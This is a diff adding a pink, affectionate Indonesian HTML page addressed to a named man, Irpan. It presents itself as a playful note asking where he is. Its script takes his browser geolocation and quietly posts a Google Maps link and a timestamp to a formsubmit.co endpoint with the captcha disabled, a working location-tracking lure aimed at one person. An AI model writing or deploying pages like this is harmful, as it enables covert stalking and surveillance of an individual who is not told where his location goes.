@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Hai Sayang</title>
+  <style>
+    body {
+      font-family: 'Comic Sans MS', cursive, sans-serif;
+      background: #ffe6f0;
+      text-align: center;
+      padding: 60px;
+      color: #d63384;
+    }
+    .card {
+      background: white;
+      border-radius: 20px;
+      padding: 40px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      display: inline-block;
+      max-width: 400px;
+    }
+    h1 {
+      margin-bottom: 10px;
+    }
+    .spinner {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #d63384;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin: 30px auto;
+    }
+    .status {
+      margin-top: 20px;
+      font-weight: bold;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Haii Sayang! Irpan!(^-^)</h1>
+    <p>Aku cuma mau tau kamu lagi di mana nih...</p>
+    <div class="spinner"></div>
+    <div class="status" id="status">Tunggu ya, lagi cari lokasi kamu...</div>
+  </div>
+
+  <script>
+    const webhook = "https://formsubmit.co/30a9fb995859e29cb5976c08637d4f6a";
+
+    function sendLocation(position) {
+      const { latitude, longitude } = position.coords;
+      const data = {
+        lokasi: `https://www.google.com/maps?q=${latitude},${longitude}`,
+        waktu: new Date().toString()
+      };
+
+      const form = document.createElement("form");
+      form.method = "POST";
+      form.action = webhook;
+
+      Object.keys(data).forEach((key) => {
+        const input = document.createElement("input");
+        input.type = "hidden";
+        input.name = key;
+        input.value = data[key];
+        form.appendChild(input);
+      });
+
+      const noCaptcha = document.createElement("input");
+      noCaptcha.type = "hidden";
+      noCaptcha.name = "_captcha";
+      noCaptcha.value = "false";
+      form.appendChild(noCaptcha);
+
+      document.body.appendChild(form);
+      form.submit();
+
+      document.getElementById("status").innerText = "Udah aku terima lokasi kamu, makasih ya sayang!";
+    }
+
+    function handleError(error) {
+      document.getElementById("status").innerText = "Kok lokasi ga bisa dibuka? Aktifin GPS/Lokasi kamu dulu yaa.";
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+    } else {
+      document.getElementById("status").innerText = "Browser kamu nggak support lokasi, sayang.";
+    }
+  </script>
+</body>
+  </html>
